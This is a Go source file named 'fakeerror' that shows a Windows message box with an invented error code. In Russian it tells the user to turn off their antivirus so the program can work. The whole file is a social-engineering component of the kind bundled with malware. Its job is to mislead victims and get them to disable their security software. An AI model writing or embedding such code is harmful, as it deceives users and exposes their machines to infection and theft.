package fakeerror

import (
	"syscall"
	"unsafe"
)

func Run() {
	var title, text *uint16
	title, _ = syscall.UTF16PtrFromString("Неизвестная ошибка")
	text, _ = syscall.UTF16PtrFromString("Код ошибки: Windows_0x988958\nПопробуйте выключить антивирус для работы программы.")
	syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(0, uintptr(unsafe.Pointer(text)), uintptr(unsafe.Pointer(title)), 0)
}
